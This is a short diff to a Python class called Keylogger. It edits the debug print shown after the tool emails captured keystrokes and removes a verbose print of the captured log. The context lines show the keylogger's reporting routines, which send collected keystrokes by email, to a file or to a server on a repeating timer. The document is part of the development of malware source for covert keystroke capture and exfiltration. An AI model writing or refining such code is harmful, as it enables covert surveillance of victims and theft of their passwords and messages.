@@ -100,7 +100,7 @@ class Keylogger():
             server.quit()
 
             if verbose:
-              print(f"{datetime.now()} - Sent an email to {email} containing:  {message}")
+              print(f"[+] Sent an email to {email} containing: {message}")
 
         # --- End Email implementation stuff --- 
 
@@ -116,8 +116,6 @@ class Keylogger():
                     self.report_to_file()
                 elif self.report_type == "server":
                     self.report_to_server()
-                if verbose:
-                    print(f"[{self.filename}] - {self.log}")
                 self.start_dt = datetime.now()
             self.log = ""
             timer = Timer(interval=self.interval, function=self.report)
